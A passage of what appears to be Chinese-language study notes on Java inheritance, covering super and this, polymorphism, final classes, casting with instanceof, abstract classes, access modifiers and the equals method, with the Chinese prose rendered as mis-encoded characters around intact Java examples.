punctuation">&#125;</span></code></pre><p><strong>‰ΩøÁî®superË∞ÉÁî®ÊûÑÈÄ†Âô®ÁöÑËØ≠Âè•ÂøÖÈ°ªÊòØÂ≠êÁ±ªÊûÑÈÄ†Âô®ÁöÑÁ¨¨‰∏ÄÊù°ËØ≠Âè•„ÄÇ</strong></p><p>Â¶ÇÊûúÂ≠êÁ±ªÁöÑÊûÑÈÄ†Âô®Ê≤°ÊúâÊòæÂºèÂú∞Ë∞ÉÁî®Ë∂ÖÁ±ªÁöÑÊûÑÈÄ†Âô®ÔºåËÆ≤Ëá™Âä®Ë∞ÉÁî®Ë∂ÖÁ±ªÁöÑÊó†ÂèÇÊï∞ÊûÑÈÄ†Âô®„ÄÇÂ¶ÇÊûúË∂ÖÁ±ªÊ≤°ÊúâÊó†ÂèÇÊï∞ÁöÑÊûÑÈÄ†Âô®ÔºåÂπ∂‰∏îÂú®Â≠êÁ±ªÁöÑÊûÑÈÄ†Âô®‰∏≠ÂèàÊ≤°ÊúâÊòæÂºèÂú∞Ë∞ÉÁî®Ë∂ÖÁ±ªÁöÑÂÖ∂‰ªñÊûÑÈÄ†Âô®ÔºåJavaÁºñËØëÂô®Â∞±‰ºöÊä•Âëä‰∏Ä‰∏™ÈîôËØØ„ÄÇ</p><p>thisÔºö</p><ul><li>ÊåáÁ§∫ÈöêÂºèÂèÇÊï∞ÁöÑÂºïÁî®„ÄÇ</li><li>Ë∞ÉÁî®ËØ•Á±ªÁöÑÂÖ∂‰ªñÊûÑÈÄ†Âô®„ÄÇ</li></ul><p>superÔºö</p><ul><li>Ë∞ÉÁî®Ë∂ÖÁ±ªÁöÑÊñπÊ≥ï„ÄÇ</li><li>Ë∞ÉÁî®Ë∂ÖÁ±ªÁöÑÊûÑÈÄ†Âô®„ÄÇ</li></ul><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token class-name">Manager</span> boss <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Manager</span><span class="token punctuation">(</span><span class="token string">"feng1"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    boss<span class="token punctuation">.</span><span class="token function">setBonus</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    staff<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> boss<span class="token punctuation">;</span>    staff<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng2"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    staff<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng3"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> e<span class="token operator">:</span>staff<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>Â∞ΩÁÆ°Â∞ÜeÂ£∞Êòé‰∏∫EmployeeÁ±ªÂûãÔºå‰ΩÜÂÆûÈôÖ‰∏äeÊó¢ÂèØ‰ª•ÂºïÁî®EmployeeÁ±ªÂûãÁöÑÂØπË±°Ôºå‰πüÂèØ‰ª•ÂºïÁî®ManagerÁ±ªÂûãÁöÑÂØπË±°„ÄÇ</p><p>ËôöÊãüÊú∫Áü•ÈÅìeÂÆûÈôÖÂºïÁî®ÁöÑÂØπË±°Á±ªÂûãÔºåÂõ†Ê≠§ËÉΩÂ§üÊ≠£Á°ÆÂú∞Ë∞ÉÁî®Áõ∏Â∫îÁöÑÊñπÊ≥ï„ÄÇ</p><p>‰∏Ä‰∏™ÂØπË±°ÂèòÈáèÂèØ‰ª•ÊåáÁ§∫Â§öÁßçÂÆûÈôÖÁ±ªÂûãÁöÑÁé∞Ë±°Áß∞‰∏∫<strong>Â§öÊÄÅ</strong>„ÄÇÂú®ËøêË°åÊó∂ËÉΩÂ§üËá™Âä®Âú∞ÈÄâÊã©ÈÄÇÂΩìÁöÑÊñπÊ≥ïÔºåÁß∞‰∏∫<strong>Âä®ÊÄÅÁªëÂÆö</strong>„ÄÇ</p><h4 id="Â§öÊÄÅ"><a href="#Â§öÊÄÅ" class="headerlink" title="Â§öÊÄÅ"></a>Â§öÊÄÅ</h4><p>is-aËßÑÂàôÔºåÂÆÉÊåáÂá∫Â≠êÁ±ªÁöÑÊØè‰∏™ÂØπË±°‰πüÊòØË∂ÖÁ±ªÁöÑÂØπË±°„ÄÇ</p><p><strong>is-aËßÑÂàôÁöÑÂè¶‰∏ÄÁßçË°®Ëø∞ÊòØÊõøÊç¢ÂéüÂàô„ÄÇÂÆÉÊåáÂá∫Á®ãÂ∫è‰∏≠Âá∫Áé∞Ë∂ÖÁ±ªÂØπË±°ÁöÑ‰ªª‰ΩïÂú∞ÊñπÈÉΩÂèØ‰ª•‰ΩøÁî®Â≠êÁ±ªÂØπË±°ÊõøÊç¢„ÄÇ</strong></p><p>Âú®JavaÁ®ãÂ∫èËÆæËÆ°ËØ≠Ë®Ä‰∏≠ÔºåÂØπË±°ÂèòÈáèÊòØÂ§öÊÄÅÁöÑ„ÄÇ‰∏Ä‰∏™EmployeeÁ±ªÂûãÁöÑÂèòÈáèÊó¢ÂèØ‰ª•ÂºïÁî®‰∏Ä‰∏™EmployeeÁ±ªÂûãÁöÑÂØπË±°Ôºå‰πüÂèØ‰ª•ÂºïÁî®EmployeeÁ±ªÁöÑ‰ªª‰Ωï‰∏Ä‰∏™Â≠êÁ±ªÁöÑÂØπË±°„ÄÇ</p><p>‰∏çËÉΩÂ∞ÜË∂ÖÁ±ªÁöÑÂºïÁî®ËµãÁªôÂ≠êÁ±ªÂèòÈáè„ÄÇ</p><blockquote><p>Âú®Java‰∏≠ÔºåÂ≠êÁ±ªÂºïÁî®ÁöÑÊï∞ÁªÑÂèØ‰ª•ËΩ¨Êç¢ÊàêË∂ÖÁ±ªÂºïÁî®ÁöÑÊï∞ÁªÑÔºåËÄå‰∏çÈúÄË¶Å‰ΩøÁî®Âº∫Âà∂Á±ªÂûãËΩ¨Êç¢„ÄÇ</p></blockquote><p>Âú®Ë¶ÜÁõñ‰∏Ä‰∏™ÊñπÊ≥ïÁöÑÊó∂ÂÄôÔºåÂ≠êÁ±ªÊñπÊ≥ï‰∏çËÉΩ‰Ωé‰∫éË∂ÖÁ±ªÊñπÊ≥ïÁöÑÂèØËßÅÊÄß„ÄÇÁâπÂà´ÊòØÔºåÂ¶ÇÊûúË∂ÖÁ±ªÊñπÊ≥ïÊòØpublicÔºåÂ≠êÁ±ªÊñπÊ≥ïÂøÖÈ°ª‰πüË¶ÅÂ£∞Êòé‰∏∫public„ÄÇ</p><h4 id="ÈòªÊ≠¢ÁªßÊâøÔºöfinalÁ±ªÂíåÊñπÊ≥ï"><a href="#ÈòªÊ≠¢ÁªßÊâøÔºöfinalÁ±ªÂíåÊñπÊ≥ï" class="headerlink" title="ÈòªÊ≠¢ÁªßÊâøÔºöfinalÁ±ªÂíåÊñπÊ≥ï"></a>ÈòªÊ≠¢ÁªßÊâøÔºöfinalÁ±ªÂíåÊñπÊ≥ï</h4><p>‰∏çÂÖÅËÆ∏ÊãìÂ±ïÁöÑÁ±ªË¢´Áß∞‰∏∫finalÁ±ª„ÄÇÂú®ÂÆö‰πâÁ±ªÁöÑÊó∂ÂÄô‰ΩøÁî®final‰øÆÈ•∞Á¨¶Â∞±Ë°®ÊòéËøô‰∏™Á±ªÊòØfinalÁ±ª„ÄÇ</p><p>Á±ª‰∏≠ÁöÑÊüê‰∏™ÁâπÂÆöÊñπÊ≥ï‰πüÂèØ‰ª•Ë¢´Â£∞Êòé‰∏∫final„ÄÇÂ¶ÇÊûúËøôÊ†∑ÂÅöÔºåÂ≠êÁ±ªÂ∞±‰∏çËÉΩË¶ÜÁõñËøô‰∏™ÊñπÊ≥ïÔºàfinalÁ±ª‰∏≠ÁöÑÊâÄÊúâÊñπÊ≥ïËá™Âä®Âú∞Êàê‰∏∫finalÊñπÊ≥ïÔºå‰ΩÜÊòØ‰∏çÂåÖÊã¨Â≠óÊÆµÔºå‰πüÂ∞±ÊòØËØ¥Â≠óÊÆµ‰∏ç‰ºöËá™Âä®Êàê‰∏∫finalÔºâ„ÄÇ</p><h4 id="Âº∫Âà∂Á±ªÂûãËΩ¨Êç¢"><a href="#Âº∫Âà∂Á±ªÂûãËΩ¨Êç¢" class="headerlink" title="Âº∫Âà∂Á±ªÂûãËΩ¨Êç¢"></a>Âº∫Âà∂Á±ªÂûãËΩ¨Êç¢</h4><p><strong>Â∞Ü‰∏Ä‰∏™ÂÄºÂ≠òÂÖ•ÂèòÈáèÊó∂ÔºåÁºñËØëÂô®Â∞ÜÊ£ÄÊü•‰Ω†ÊòØÂê¶ÊâøËØ∫ËøáÂ§ö„ÄÇÂ¶ÇÊûúÂ∞Ü‰∏Ä‰∏™Â≠êÁ±ªÁöÑÂºïÁî®ËµãÂÄºÁªô‰∏Ä‰∏™Ë∂ÖÁ±ªÂèòÈáèÔºåÁºñËØëÂô®ÊòØÂÖÅËÆ∏ÁöÑ„ÄÇ‰ΩÜÂ∞Ü‰∏Ä‰∏™Ë∂ÖÁ±ªÁöÑÂºïÁî®ËµãÁªô‰∏Ä‰∏™Â≠êÁ±ªÂèòÈáèÊó∂ÔºåÂ∞±ÊâøËØ∫ËøáÂ§ö‰∫Ü„ÄÇÂøÖÈ°ªËøõË°åÂº∫Âà∂Á±ªÂûãËΩ¨Êç¢ÔºåËøôÊ†∑ÊâçËÉΩÂ§üÈÄöËøáËøêË°åÊó∂ÁöÑÊ£ÄÊü•„ÄÇ</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Manager</span> test1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Manager</span><span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Employee</span> test2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"test2"</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Employee</span> test3 <span class="token operator">=</span> test1<span class="token punctuation">;</span>  <span class="token comment">//ÂèØ‰ª•</span><span class="token class-name">Manager</span> test4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Manager</span><span class="token punctuation">)</span> test2<span class="token punctuation">;</span>  <span class="token comment">//ÂøÖÈ°ªÂº∫Âà∂Á±ªÂûãËΩ¨Êç¢„ÄÇËÄå‰∏îËøôÊ†∑ÊòØÊúâÈóÆÈ¢òÁöÑ„ÄÇ</span></code></pre><blockquote><p>Êàë‰∏™‰∫∫ÁöÑÁêÜËß£Â∞±ÊòØÔºåÂ≠êÁ±ªÂèØ‰ª•Áõ¥Êé•ÈöêÂºèËΩ¨Êç¢ÊàêÁà∂Á±ªÔºå‰ΩÜÊòØÁà∂Á±ªÈúÄË¶ÅÂº∫Âà∂Á±ªÂûãËΩ¨Êç¢ÊàêÂ≠êÁ±ª„ÄÇ</p></blockquote><p>Âú®ËøõË°åÂº∫Âà∂Á±ªÂûãËΩ¨Êç¢‰πãÂâçÔºåÂÖàÊü•ÁúãÊòØÂê¶ËÉΩÂ§üÊàêÂäüÂú∞ËΩ¨Êç¢„ÄÇ‰∏∫Ê≠§Âè™ÈúÄË¶Å‰ΩøÁî®instanceofÊìç‰ΩúÁ¨¶Â∞±ÂèØ‰ª•ÂÆûÁé∞„ÄÇ</p><p><code>instanceof</code>ÊòØJava‰∏≠ÁöÑ‰∫åÂÖÉËøêÁÆóÁ¨¶ÔºåÂ∑¶ËæπÊòØÂØπË±°ÔºåÂè≥ËæπÊòØÁ±ªÔºõÂΩìÂØπË±°ÊòØÂè≥ËæπÁ±ªÊàñÂ≠êÁ±ªÊâÄÂàõÂª∫ÂØπË±°Êó∂ÔºåËøîÂõûtrueÔºõÂê¶ÂàôÔºåËøîÂõûfalse„ÄÇ</p><ul><li><code>instanceof</code>ÊòØJava‰∏≠ÁöÑ‰∫åÂÖÉËøêÁÆóÁ¨¶ÔºåÂ∑¶ËæπÊòØÂØπË±°ÔºåÂè≥ËæπÊòØÁ±ªÔºõÂΩìÂØπË±°ÊòØÂè≥ËæπÁ±ªÊàñÂ≠êÁ±ªÊâÄÂàõÂª∫ÂØπË±°Êó∂ÔºåËøîÂõûtrueÔºõÂê¶ÂàôÔºåËøîÂõûfalse„ÄÇ</li><li><code>instanceof</code>Â∑¶ËæπÊòæÂºèÂ£∞ÊòéÁöÑÁ±ªÂûã‰∏éÂè≥ËæπÊìç‰ΩúÂÖÉÂøÖÈ°ªÊòØÂêåÁßçÁ±ªÊàñÂ≠òÂú®ÁªßÊâøÂÖ≥Á≥ªÔºå‰πüÂ∞±ÊòØËØ¥ÈúÄË¶Å‰Ωç‰∫éÂêå‰∏Ä‰∏™ÁªßÊâøÊ†ëÔºåÂê¶Âàô‰ºöÁºñËØëÈîôËØØ„ÄÇ</li></ul><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Manager</span> test1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Manager</span><span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Employee</span> test2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"test2"</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Employee</span> test3 <span class="token operator">=</span> test1<span class="token punctuation">;</span><span class="token comment">//Manager test4 = (Manager) test2;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>test2 <span class="token keyword">instanceof</span> <span class="token class-name">Manager</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Manager</span> test4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Manager</span><span class="token punctuation">)</span> test2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ÊâÄ‰ª•ÂæàÊòéÊòæËøôÊòØËøõÂÖ•‰∏ç‰∫Ü<code>if</code>ÁöÑ„ÄÇ</p><ul><li>Âè™ËÉΩÂú®ÁªßÊâøÂ±ÇÊ¨°ÂÜÖËøõË°åÂº∫Âà∂Á±ªÂûãËΩ¨Êç¢„ÄÇ</li><li>Âú®Â∞ÜË∂ÖÁ±ªÂº∫Âà∂ËΩ¨Êç¢ÊàêÂ≠êÁ±ª‰πãÂâçÔºåÂ∫îËØ•‰ΩøÁî®<code>instanceof</code>ËøõË°åÊ£ÄÊü•</li></ul><p><strong>‰∏ÄËà¨ÊÉÖÂÜµ‰∏ãÔºåÊúÄÂ•ΩÂ∞ΩÈáèÂ∞ëÁî®Âº∫Âà∂Á±ªÂûãËΩ¨Êç¢Âíå<code>instanceof</code>ËøêÁÆóÁ¨¶</strong></p><h4 id="ÊäΩË±°Á±ª"><a href="#ÊäΩË±°Á±ª" class="headerlink" title="ÊäΩË±°Á±ª"></a>ÊäΩË±°Á±ª</h4><p>‰∏∫‰∫ÜÊèêÈ´òÁ®ãÂ∫èÁöÑÊ∏ÖÊô∞Â∫¶ÔºåÂåÖÂê´‰∏Ä‰∏™ÊàñÂ§ö‰∏™ÊäΩË±°ÊñπÊ≥ïÁöÑÁ±ªÊú¨Ë∫´ÂøÖÈ°ªË¢´Â£∞Êòé‰∏∫<strong>ÊäΩË±°</strong>ÁöÑ„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token class-name">String</span> <span class="token function">getDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>Èô§‰∫ÜÊäΩË±°ÊñπÊ≥ï‰πãÂ§ñÔºåÊäΩË±°Á±ªËøòÂèØ‰ª•ÂåÖÂê´Â≠óÊÆµÂíåÂÖ∑‰ΩìÊñπÊ≥ï„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token class-name">String</span> <span class="token function">getDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>Êúâ‰∫õÁ®ãÂ∫èÂëòËÆ§‰∏∫ÔºåÂú®ÊäΩË±°Á±ª‰∏≠‰∏çËÉΩÂåÖÂê´ÂÖ∑‰ΩìÊñπÊ≥ïÔºå„ÄÇÂª∫ËÆÆÂ∞ΩÈáèÂ∞ÜÈÄöÁî®ÁöÑÂ≠óÊÆµÂíåÊñπÊ≥ïÔºà‰∏çÁÆ°ÊòØÂê¶ÊòØÊäΩË±°ÁöÑÔºâÊîæÂú®Ë∂ÖÁ±ªÔºà‰∏çÁÆ°ÊòØÂê¶ÊòØÊäΩË±°Á±ªÔºâ‰∏≠„ÄÇ</p></blockquote><p>ÊãìÂ±ïÊäΩË±°Á±ªÂèØ‰ª•Êúâ‰∏§ÁßçÈÄâÊã©Ôºå‰∏ÄÁßçÊòØÂú®Â≠êÁ±ª‰∏≠‰øùÁïôÊäΩË±°Á±ªÁöÑÈÉ®ÂàÜÊàñÊâÄÊúâÊäΩË±°ÊñπÊ≥ï‰ªçÊú™ÂÆö‰πâÔºåËøôÊ†∑Â∞±ÂøÖÈ°ªÂ∞ÜÂ≠êÁ±ª‰πüÊ†áËÆ∞‰∏∫ÊäΩË±°Á±ªÔºõÂè¶‰∏ÄÁßçÂÅöÊ≥ïÊòØÂÆö‰πâÂÖ®ÈÉ®ÊñπÊ≥ïÔºåËøôÊ†∑‰∏ÄÊù•ÔºåÂ≠êÁ±ªÂ∞±‰∏çÊòØÊäΩË±°ÁöÑ‰∫Ü„ÄÇ</p><p>Âç≥‰Ωø‰∏çÂê´ÊäΩË±°ÊñπÊ≥ïÔºå‰πüÂèØ‰ª•Â∞ÜÁ±ªÂ£∞Êòé‰∏∫ÊäΩË±°Á±ª„ÄÇ</p><p><strong>ÊäΩË±°Á±ª‰∏çËÉΩÂÆû‰æãÂåñ„ÄÇ</strong>‰ΩÜÊòØÂèØ‰ª•ÂÆö‰πâ‰∏Ä‰∏™ÊäΩË±°Á±ªÁöÑÊàêÂëòÂèòÈáèÔºå‰ΩÜÊòØËøôÊ†∑‰∏Ä‰∏™ÂèòÈáèÂè™ËÉΩÂºïÁî®ÈùûÊäΩË±°Â≠êÁ±ªÁöÑÂØπË±°„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Person</span> person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="Âèó‰øùÊä§ËÆøÈóÆ"><a href="#Âèó‰øùÊä§ËÆøÈóÆ" class="headerlink" title="Âèó‰øùÊä§ËÆøÈóÆ"></a>Âèó‰øùÊä§ËÆøÈóÆ</h3><p>Âú®Java‰∏≠Ôºå‰øùÊä§Â≠óÊÆµÂè™ËÉΩÁî±Âêå‰∏Ä‰∏™ÂåÖ‰∏≠ÁöÑÁ±ªËÆøÈóÆ„ÄÇ</p><ol><li>‰ªÖÂØπÊú¨Á±ªÂèØËßÅÔºöprivate</li><li>ÂØπÂ§ñÈÉ®ÂÆåÂÖ®ÂèØËßÅÔºöpublic</li><li>ÂØπÊú¨ÂåÖÂíåÊâÄÊúâÂ≠êÁ±ªÂèØËßÅÔºöprotected</li><li>ÂØπÊú¨ÂåÖÂèØËßÅÔºöÈªòËÆ§ÔºàÂæàÈÅóÊÜæÔºâÔºå‰∏çÈúÄË¶Å‰øÆÈ•∞Á¨¶</li></ol><h4 id="ObjectÔºöÊâÄÊúâÁ±ªÁöÑË∂ÖÁ±ª"><a href="#ObjectÔºöÊâÄÊúâÁ±ªÁöÑË∂ÖÁ±ª" class="headerlink" title="ObjectÔºöÊâÄÊúâÁ±ªÁöÑË∂ÖÁ±ª"></a>ObjectÔºöÊâÄÊúâÁ±ªÁöÑË∂ÖÁ±ª</h4><p>ÂèØ‰ª•‰ΩøÁî®<code>Object</code>Á±ªÂûãÁöÑÂèòÈáèÂºïÁî®‰ªª‰ΩïÁ±ªÂûãÁöÑÂØπË±°Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Object</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Manager</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>Object</code>Á±ªÂûãÁöÑÂèòÈáèÂè™ËÉΩÁî®‰∫é‰Ωú‰∏∫ÂêÑÁßçÂÄºÂæó‰∏Ä‰∏™Ê≥õÂûãÂÆπÂô®„ÄÇË¶ÅÊÉ≥ÂØπÂÖ∂‰∏≠ÂæóÂÜÖÂÆπËøõË°åÂÖ∑‰ΩìÁöÑÊìç‰ΩúÔºåËøòÈúÄË¶ÅÊ∏ÖÊ•öÂØπË±°ÁöÑÂéüÂßãÁ±ªÂûãÔºåÂπ∂ËøõË°åÁõ∏Â∫îÁöÑÂº∫Âà∂Á±ªÂûãËΩ¨Êç¢Ôºõ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Object</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Manager</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Manager</span> feng <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Manager</span><span class="token punctuation">)</span> obj<span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>feng<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Âú®Java‰∏≠ÔºåÂè™ÊúâÂü∫Êú¨Á±ªÂûã‰∏çÊòØÂØπË±°Ôºå‰æãÂ¶ÇÊï∞ÂÄº„ÄÅÂ≠óÁ¨¶„ÄÅÂ∏ÉÂ∞îÁ±ªÂûãÁ≠âÈÉΩ‰∏çÊòØÂØπË±°„ÄÇ</p><h4 id="equalsÊñπÊ≥ï"><a href="#equalsÊñπÊ≥ï" class="headerlink" title="equalsÊñπÊ≥ï"></a>equalsÊñπÊ≥ï</h4><p><code>Object</code>Á±ª‰∏≠ÁöÑ<code>equals</code>ÊñπÊ≥ïÁî®‰∫éÊ£ÄÊµã‰∏Ä‰∏™ÂØπË±°ÊòØÂê¶Á≠â‰∫éÂè¶Â§ñ‰∏Ä‰∏™ÂØπË±°„ÄÇ</p><p>‰æãÂ¶ÇEmployeeÁ±ªÂÆûÁé∞‰∏Ä‰∏™<code>equals</code>ÊñπÊ≥ïÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> otherObject<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">==</span> otherObject<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>otherObject <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> otherObject<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token class-name">Employee</span> other <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Employee</span><span class="token punctuation">)</span> otherObject<span class="token punctuation">;</span>    <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Objects</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>other<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token operator">&amp;&amp;</span>salary <span class="token operator">==</span> other<span class="token punctuation">.</span><span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token operator">&amp;&amp;</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>other<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>getClass</code>ÊñπÊ≥ïÂ∞ÜËøîÂõû‰∏Ä‰∏™ÂØπË±°ÊâÄÂ±ûÁöÑÁ±ª„ÄÇ</p><blockquote><p>Returns the runtime class of this <code>Object</code>. The returned <code>Class</code> object is the object that is locked by <code>static synchronized</code> methods of the represented class.</p></blockquote><p>‰∏∫‰∫ÜÈò≤Â§ánameÂèØËÉΩ‰∏∫nullÁöÑÊÉÖÂÜµÔºåÈúÄË¶Å‰ΩøÁî®<code>Objects.equals</code>ÊñπÊ≥ï„ÄÇÂ¶ÇÊûú‰∏§‰∏™ÂèÇÊï∞ÈÉΩ‰∏∫nullÔºåÂàô<code>Objects.equals(a,b)</code>Ë∞ÉÁî®Â∞ÜËøîÂõûtrue„ÄÇÂ¶ÇÊûúÂÖ∂‰∏≠‰∏Ä‰∏™ÂèÇÊï∞‰∏∫nullÔºåÂàôËøîÂõûfalseÔºõÂê¶ÂàôÔºåÂ¶ÇÊûú‰∏§‰∏™ÂèÇÊï∞ÈÉΩ‰∏ç‰∏∫nullÔºåÂàôË∞ÉÁî®<code>a.equals(b)</code>„ÄÇ</p><p>ÂÆåÁæéÁöÑ<code>equals</code>ÊñπÊ≥ïÁöÑÂª∫ËÆÆÔºö</p><ol><li>ÊòæÂºèÂèÇÊï∞ÂëΩÂêç‰∏∫otherObjectÔºåÁ®çÂêéÈúÄË¶ÅÂ∞ÜÂÆÉÂº∫Âà∂ËΩ¨Êç¢‰∏∫Âè¶‰∏Ä‰∏™Âêç‰∏∫otherÁöÑÂèòÈáè„ÄÇ</li><li>Ê£ÄÊµãthis‰∏é<code>otherObject</code>ÊòØÂê¶Áõ∏Á≠âÔºö<br><code>if(this == otherObject) return 